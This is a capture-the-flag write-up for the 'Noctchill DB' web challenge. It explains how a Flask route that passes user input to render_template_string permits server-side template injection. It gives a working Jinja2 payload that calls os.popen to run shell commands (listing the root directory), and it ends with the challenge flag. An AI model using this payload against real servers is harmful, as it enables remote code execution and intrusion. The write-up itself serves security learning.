# Noctchill DB
> Checkout my Noctchill Database Page.

## About the Challenge
Given a website along with its source code (You can get the source code [here](web_noctchill_db.zip)), when we open the website we will be met with shiny color members :D.


[Image extracted text: noctchiil
Welcome
to my
noctchill
database!
Who is your
favorite idol?
4
Hinana
oru
Madoka
Koito]


And then when I checking the code, apparently there is no filter in the idol detail endpoint section which can result in Server-Side Template Injection (SSTI)


[Image extracted text: @app.route( ' /<idol>
def detail(idol)
idol
idol.lower
render
render_template( ' idol.html
data-idols[idol]_
return
render_template_string(render)
except
try:
if(not filter(idol) _
return render_templatee
invalid.html
render
render_template
404.html
idol-idol)
return render_template_string(render)
except:
return
"Internal
server
error
try]



[Image extracted text: Jss= text-neutral-900
class=
m-auto W-fit
text
center
backdrop-blur-lg
borde
<hl
class=
text-3xl
font-black"
404 Not
Found!< /hl>
<hl
class=
font-bold">"{ {
idol }}"
isn
noctchill
member
href=
class="
underline
>Back
to home
<fa>
Lv>]


## How to Solve?
First I test the website using the payload as below

```
http://103.152.242.116:6712/{{7*7}}
```

And it turns out that the output is `49` which means vulnerable to SSTI


[Image extracted text: 404
Not
Found !
49"
isn
noctchill
member !
Back_
to_home_]


After testing a lot of payloads and reading other CTF event writeups, I found the final payload to perform RCE on the server

```
http://103.152.242.116:6712/{{url_for.__globals__.os.__dict__.popen(request.args.file).read()}}?file=ls /
```


[Image extracted text: 404
Not
Found!
"bin boot dev etc flag_68b329da98.txt
home lib lib64 media mnt opt proc
root
run sbin
srv sys tmp
usr
var
isn
noctchill member!
Back_
to
home _]


Open the `flag_68b329da98.txt` file to get the flag

```
ARA2023{its_n0t_th4t_h4rd_r1ghT??}
```